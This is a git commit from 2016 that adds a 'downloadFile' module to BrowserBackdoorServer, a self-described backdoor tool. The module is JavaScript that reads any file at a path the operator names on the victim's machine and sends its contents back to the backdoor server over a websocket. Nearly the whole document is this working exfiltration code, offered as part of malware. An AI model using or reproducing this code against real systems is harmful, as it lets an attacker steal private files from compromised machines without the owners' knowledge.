b1154309c38293bdc4359ad31d0f9c9261ca4011
IMcPwn <imcpwn@protonmail.com>
2016-06-11 12:16:45 -0400

    Add downloadFile module

---
+++ server/modules/downloadFile.js
@@ -0,0 +1,22 @@
+// INTERACTIVE
+/*
+ * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
+ * BrowserBackdoorServer by IMcPwn.
+ * See the file 'LICENSE' for copying permission
+ *
+ * Info: Downloads a file from the client
+ * Parameters: fullPath, encoding
+ * Returns: undefined, error, file
+ * Author: IMcPwn
+ */
+
+if (typeof fs === typeof undefined) fs = require('fs');
+
+downloadFile = function (fullPath, encoding) {
+    fs.readFile(fullPath, encoding, function (err, data) {
+        if (err) ws.send(err);
+        ws.send(data);
+   });
+}
+
+return "Usage: downloadFile(fullPath, encoding)";
